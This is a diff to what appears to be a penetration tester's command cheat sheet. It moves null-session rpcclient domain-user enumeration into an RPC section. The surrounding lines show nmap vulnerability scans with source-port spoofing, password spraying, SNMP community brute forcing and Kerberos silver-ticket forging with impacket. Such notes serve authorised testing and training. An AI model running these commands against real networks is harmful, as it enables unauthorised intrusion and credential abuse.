@@ -49,14 +49,10 @@ PORTS=$(cat *_$TARGET.nmap | cut -d '/' -f 1 | sort -nu | awk '/^[0-9]/ {printf 
 (sudo nmap -Pn -n --script=vuln "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VULN_$TARGET' &)
 (sudo nmap -Pn -n -sV "$TARGET" --open -p"$PORTS" -g53 --min-rate 500 --max-rate 1500 -oA 'VERSIONS_$TARGET' &)
 
-## Create a hosts list
+## Create hosts lists
 echo '$TARGET' > hosts
 echo '$TARGET' > dc-hosts
 echo '$TARGET' > pc-hosts
-
-## RPC - Usernames
-for host in $(cat ~/dc-hosts); do echo "================[   $host   ]==============="; rpcclient -U "" $host -N -c "enumdomusers"; done
-for host in $(cat ~/dc-hosts); do rpcclient -U "" $host -N -c "enumdomusers"; done | grep -oP 'user:\[\K[^]]+'
 
 ## Spray Services
 for host in $(cat hosts); do
@@ -557,6 +553,10 @@ TICKET_NTLM=$(echo -n '$PASSWORD' | iconv -t UTF-16LE | openssl dgst -md4 | cut 
 impacket-ticketer -domain '$DOM' -domain-sid "$TICKET_SID" -nthash "$TICKET_NTLM" -spn "$TICKET_SPN/$DOM" Administrator 2>/dev/null
 export KRB5CCNAME="$PWD/Administrator.ccache"; chmod 0600 "$KRB5CCNAME"
 impacket-describeTicket Administrator.ccache
+
+[*] (135) RPC
+for host in $(cat ~/dc-hosts); do echo "================[   $host   ]==============="; rpcclient -U "" $host -N -c "enumdomusers"; done
+for host in $(cat ~/dc-hosts); do rpcclient -U "" $host -N -c "enumdomusers"; done | grep -oP 'user:\[\K[^]]+'
 
 [*] (161) SNMP
 (onesixtyone $TARGET -c /usr/share/wordlists/seclists/Discovery/SNMP/snmp.txt -w 5 -o SNMPsmall.onesixtyone &)
